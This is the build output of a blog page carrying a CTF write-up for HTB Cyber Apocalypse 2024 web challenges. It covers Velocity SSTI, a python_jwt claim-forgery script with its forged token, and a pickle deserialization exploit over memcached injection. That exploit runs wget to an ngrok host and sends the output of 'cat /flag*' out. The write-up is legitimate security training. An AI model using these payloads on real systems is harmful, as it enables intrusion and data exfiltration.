style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        parsed_payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">loads</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">base64url_decode</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">payload</span><span style="color: #89DDFF">))</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">parsed_payload</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        parsed_payload</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">role</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">administrator</span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">        parsed_payload</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">user</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">admin_user</span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">parsed_payload</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #546E7A"># parsed_payload['exp'] = 2000000000</span></div><div class='line'><span style="color: #EEFFFF">        fake_payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">base64url_encode</span><span style="color: #89DDFF">((</span><span style="color: #82AAFF">dumps</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">parsed_payload</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">separators</span><span style="color: #89DDFF">=(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">,</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">:</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">))))</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">&#123;"  </span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> header </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">.</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> fake_payload </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">.":"","protected":"</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> header </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">", "payload":"</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> payload </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">","signature":"</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> signature </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">"&#125;</span><span style="color: #89DDFF">'</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">claime__ </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">ForgedClaims</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">jwt </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> claime__</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">create</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">claime__</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">topic</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">jwt</span><span style="color: #89DDFF">))</span></div></code></div></pre>`,el,ps,Eo,Kl,nl,cn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">&#123;"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5fdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA"&#125;</span></div></code></div></pre>`,pl,Fs,vo,sa,Fl,yn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">curl -i </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://94.237.60.112:35242/api/v1/flag</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> -H </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">Authorization: &#123;"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5fdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA"&#125;</span><span style="color: #89DDFF">'</span></div></code></div></pre>`,tl,ts,fo,la,rl,Dn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">HTB&#123;h4Pr0Xy_n3v3r_D1s@pp01n4s&#125;</span></div></code></div></pre>`,cl,G,rs,mo,aa,C,uo,il,ho,Ao,yl,wo,_o,oa,Dl,dn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> pylibmc</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> uuid</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> sys</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> flask </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> Flask</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> session</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> request</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> redirect</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> render_template</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> flask_session </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> Session</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">app </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">Flask</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">__name__</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">secret_key</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> uuid</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">uuid4</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">config</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">SESSION_TYPE</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">memcached</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">config</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">SESSION_MEMCACHED</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> pylibmc</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Client</span><span style="color: #89DDFF">([</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">127.0.0.1:11211</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">])</span></div><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #F07178">config</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">from_object</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">__name__</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #82AAFF">Session</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">app</span><span style="color: #89DDFF">)</span></div></code></div></pre>`,dl,k,go,El,bo,Co,O,Io,ea,I,ko,vl,So,To,fl,xo,jo,na,J,Xo,ml,Mo,No,pa,ul,En=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> pickle</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> os</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">RCE</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">__reduce__</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        cmd </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">wget https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> os</span><span style="color: #89DDFF">.</span><span style="color: #F07178">system</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">cmd</span><span style="color: #89DDFF">,)</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">generate_exploit</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> pickle</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">dumps</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">RCE</span><span style="color: #89DDFF">(),</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    payload_size </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">len</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">payload</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">137</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #C3E88D">set BT_:1337 0 2592000 </span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">payload_size</span><span style="color: #89DDFF">))</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> payload</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">get BT_:1337</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    pack </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">''</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> x </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">list</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">cookie</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> x </span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">64</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">            pack </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">oct</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">x</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">replace</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">0o</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">\\</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">elif</span><span style="color: #EEFFFF"> x </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">8</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">            pack </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">oct</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">x</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">replace</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">0o</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">\\</span><span style="color: #C3E88D">00</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">else</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">            pack </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">oct</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">x</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">replace</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">0o</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">\\</span><span style="color: #C3E88D">0</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #EEFFFF">"&#123;pack&#125;"</span><span style="color: #C3E88D">"</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> __name__ </span><span style="color: #89DDFF">==</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">__main__</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">generate_exploit</span><span style="color: #89DDFF">())</span></div></code></div></pre>`,hl,q,Oo,V,Fa,W,Jo,$,ta,m,Bo,Al,zo,Ro,wl,Po,Uo,_l,Ho,Go,Q,ra,cs,qo,ca,gl,vn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">RCE</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">__reduce__</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        cmd </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">wget "https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app$(cat /flag*)"</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> os</span><span style="color: #89DDFF">.</span><span style="color: #F07178">system</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">cmd</span><span style="color: #89DDFF">,)</span></div></code></div></pre>`,bl,is,Vo,ia,Cl,fn=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined"># python -m http.server 8080</span></div><div class='line'><span style="color: undefined">Serving HTTP on :: port 8080 (http://[::]:8080/) ...</span></div><div class='line'><span style="color: undefined">::1 - - [12/Mar/2024 22:06:38] code 404, message File not found</span></div><div class='line'><span style="color: undefined">::1 - - [12/Mar/2024 22:06:38] "GET /somethingHTB%7By0u_th0ught_th15_wou1d_b3_s1mpl3?&#125; HTTP/1.1" 404 -</span></div></code></div></pre>`,Il,L,ys,Wo,ya,Ds,$o,Da;return H=new ha({props:{src:"https://github.com/hash3liZer/khatta/assets/29171692/758bd543-0d9a-4543-a1a1-7d7f43cb4fb8",alt:"image"}}),V=new ha({props:{src:"https://github.com/hash3liZer/khatta/assets/29171692/b55a7d35-80e4-47d0-9283-1d92ec0b0a08",alt:"image"}}),$=new ha({props:{src:"https://github.com/hash3liZer/khatta/assets/29171692/030407bb-f81b-42a0-86dc-f260917a6d92",alt:"image"}}),Q=new ha({props:{src:"https://github.com/hash3liZer/khatta/assets/29171692/5df209cf-3e5f-4a0a-ae0b-45bc7657993c",alt:"image"}}),{c(){y=F("p"),w=n("We just finished playing the HTB Cyber Apocalypse 2024. It was real fun. I wasn’t able to mainly solve 2 of the hard challenges. Neverthless, it was real fun and just like every other time, got new things to learn. I mainly focused on web and tried one challenge from Misc which i wasn’t able to solve. Anyhow, the writeups for some of the interesting web one’s that i sovled."),_=c(),h=F("h2"),D=F("a"),A=n("WEB"),B=c(),z=F("h3"),Y=F("a"),Aa=n("Labyrinth Linguist - Easy"),Nl=c(),g=F("p"),wa=n("I reviewed whole code. First thing i noticed is the use of "),ms=F("code"),_a=n("velocity"),ga=n(" template engine in the application. Moreover, the version that was specified for usage was "),us=F("code"),ba=n("1.7"),Ca=n(":"),Ol=c(),hs=new d(!1),As=c(),K=F("p"),Ia=n("The specified version was quite an outdated version of the library. Now, first thing i did was try to read the code and look for any SSTIs."),Jl=c(),ws=new d(!1),_s=c(),T=F("p"),ka=n("So, we definitely are replacing the the word "),gs=F("code"),Sa=n("TEXT"),Ta=n(" with the our input. And later on this code was processed here:"),Bl=c(),bs=new d(!1),Cs=c(),v=F("p"),xa=n("At first i confirmed the injection by providing the "),Is=F("code"),ja=n("$name"),Xa=n(" value to the "),ks=F("code"),Ma=n("text"),Na=n(" parameter and it replaced it with "),Ss=F("code"),Oa=n("world"),Ja=n(". Now, doing a bit of googling, i discovered a "),Ts=F("code"),Ba=n("CVE"),za=n(" for this specific version of "),xs=F("code"),Ra=n("Velocity"),Pa=n(`.
I used the following payload with the name param`),zl=c(),js=new d(!1),Xs=c(),ss=F("p"),Ua=n("I used curl to execute the payload and got the right execution:"),Rl=c(),Ms=new d(!1),Ns=c(),x=F("p"),Ha=n("However, i had a hard time getting the flag since i wasn’t able to get a reverse shell or place some special characters in the command. This seemed like a dead end for a second. But then i fired up "),Os=F("code"),Ga=n("sstimap"),qa=n(` against it.
And to my surprise i was able to get an OS Shell directly without having to do the CVE exploit:`),Pl=c(),Js=new d(!1),Bs=c(),ls=F("p"),Va=n("Get the flag"),Ul=c(),zs=new d(!1),Rs=c(),R=F("h3"),as=F("a"),Wa=n("LockTalk"),Hl=c(),os=F("p"),$a=n("It was a flask application with haproxy in front of the application. Reviewing the code, i found 3 APIs that i can request:"),Gl=c(),Ps=new d(!1),Us=c(),b=F("p"),Qa=n("The goal here is to generate a ticket and somehow modify the claim so that the role we use is of administrator. However, we can’t simply request the "),Hs=F("code"),La=n("/get_ticket"),Za=n(" api because of "),Gs=F("code"),Ya=n("haproxy"),Ka=n(":"),ql=c(),qs=new d(!1),Vs=c(),es=F("p"),so=n("I bypassed the filter rule with the simple listing:"),Vl=c(),Ws=new d(!1),$s=c(),j=F("p"),lo=n("The above returned me with the "),Qs=F("code"),ao=n("JWT"),oo=n(" token needed."),Wl=c(),Ls=new d(!1),Zs=c(),X=F("p"),eo=n("Now, checking the requirements of project, i found "),Ys=F("code"),no=n("python_jwt==3.3.3"),po=n(":"),$l=c(),Ks=new d(!1),sl=c(),P=F("p"),Fo=n("Heading to google, i found a security advisory of the project on Github: "),M=F("a"),to=n("https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp"),Ql=c(),U=F("p"),ro=n("It seems as if i can modify the claims of the JWT for versions "),ll=F("code"),co=n("<3.3.4"),Ll=c(),ns=F("p"),Sl(H.$$.fragment),Zl=c(),N=F("p"),io=n("In one of the commits of the repo of fixing this issue i found a code that i the modified to write my own exploit. Make sure to replace the token in the "),al=F("code"),yo=n("create"),Do=n(" method:"),Yl=c(),ol=new d(!1),el=c(),ps=F("p"),Eo=n("I ran the code and got the following payload:"),Kl=c(),nl=new d(!1),pl=c(),Fs=F("p"),vo=n("Note that we need to place the payload as it is as our new JWT token to make it work:"),sa=c(),Fl=new d(!1),tl=c(),ts=F("p"),fo=n("And got the flag:"),la=c(),rl=new d(!1),cl=c(),G=F("h3"),rs=F("a"),mo=n("SerialFlow"),aa=c(),C=F("p"),uo=n("Analyzing the code of the application, i got that application is using the library "),il=F("code"),ho=n("flask-session"),Ao=n(" with "),yl=F("code"),wo=n("pylibmc"),_o=n(" to store sessions in memcached."),oa=c(),Dl=new d(!1),dl=c(),k=F("p"),go=n("At this point, i thougt it would be a plain memcached injection but nothing. Doing a bit of google i found various articles on memcached injection with other libraries from Python. However, i found this one blog on "),El=F("code"),bo=n("pylibmc"),Co=n(" exploitation: "),O=F("a"),Io=n("https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/"),ea=c(),I=F("p"),ko=n("Reading the blog, i got that we can do a memcached injection with "),vl=F("code"),So=n("pylibmc"),To=n(" by using carriage return line breaks by encoding the payload in a special sequence that is being understood by the HTTP protocol. However, the tricky part for me was to identify where to place the payload. In the blog, the author used a cookie named "),fl=F("code"),xo=n("notsecret"),jo=n(" which i wasn’t sure of. After spending some more time on this, i found the author’s twitter where he attached a GIF of the exploit and used it as the session cookie."),na=c(),J=F("p"),Xo=n("The good thing was we got the exploit code from the blog. I modified it a bit to send request to my "),ml=F("code"),Mo=n("ngrok"),No=n(" server:"),pa=c(),ul=new d(!1),hl=c(),q=F("p"),Oo=n(`The payload i got looked something like this:
`),Sl(V.$$.fragment),Fa=c(),W=F("p"),Jo=n(`As per the HTTP specs, we need send it with double quotes as the session cookie. I used burp:
`),Sl($.$$.fragment),ta=c(),m=F("p"),Bo=n("At first it returned me a "),Al=F("code"),zo=n("200"),Ro=n(" response. While i should have gotten an "),wl=F("code"),Po=n("Internal Server Error"),Uo=n(". Running it a couple times, returned me a request on my "),_l=F("code"),Ho=n("ngrok"),Go=n(` terminal:
`),Sl(Q.$$.fragment),ra=c(),cs=F("p"),qo=n("So, i modified the exploit a bit to get the flag:"),ca=c(),gl=new d(!1),bl=c(),is=F("p"),Vo=n("I sent the request second and got the response on terminal:"),ia=c(),Cl=new d(!1),Il=c(),L=F("h2"),ys=F("a"),Wo=n("Ending Note"),ya=c(),Ds=F("p"),$o=n("Overall, it was really fun playing the CTF and just like any other time, i got new things to learn :)"),this.h()},l(s){y=t(s,"P",{});var o=r(y);w=p(o,"We just finished playing the HTB Cyber Apocalypse 2024. It was real fun. I wasn’t able to mainly solve 2 of the hard challenges. Neverthless, it was real fun and just like every other time, got new things to learn. I mainly focused on web and tried one challenge from Misc which i wasn’t able to solve. Anyhow, the writeups for some of the interesting web one’s that i sovled."),o.forEach(l),_=i(s),h=t(s,"H2",{id:!0});var se=r(h);D=t(se,"A",{href:!0});var le=r(D);A=p(le,"WEB"),le.forEach(l),se.forEach(l),B=i(s),z=t(s,"H3",{id:!0});var ae=r(z);Y=t(ae,"A",{href:!0});var oe=r(Y);Aa=p(oe,"Labyrinth Linguist - Easy"),oe.forEach(l),ae.forEach(l),Nl=i(s),g=t(s,"P",{});var ds=r(g);wa=p(ds,"I reviewed whole code. First thing i noticed is the use of "),ms=t(ds,"CODE",{});var ee=r(ms);_a=p(ee,"velocity"),ee.forEach(l),ga=p(ds," template engine in the application. Moreover, the version that was specified for usage was "),us=t(ds,"CODE",{});var 